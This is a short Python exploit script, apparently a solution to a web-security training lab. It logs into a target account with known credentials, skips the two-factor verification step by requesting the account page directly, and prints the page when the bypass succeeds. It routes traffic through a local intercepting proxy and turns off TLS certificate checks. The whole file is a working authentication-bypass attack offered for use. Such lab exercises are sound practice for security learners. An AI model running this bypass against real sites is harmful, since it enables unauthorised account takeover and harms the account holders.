import requests,sys,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def bypass2FA_acc(s,url):
    # first login with target credential
    print("[+] Logging into target's account and bypassing 2FA verification...\n")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "montoya"}
    r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)
    
    # ByPass response
    
    myaccount_url = url + "/my-account"
    r = s.get(myaccount_url, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("[+] Successfully bypassed 2FA verification.")
        print ("\n----------------\n")
        print (r.text)
    else:
        print("[+] Exploit failed.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2 :
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)
        
    s = requests.Session()
    url = sys.argv[1]
    bypass2FA_acc(s,url)
if __name__ == "__main__" :
    main()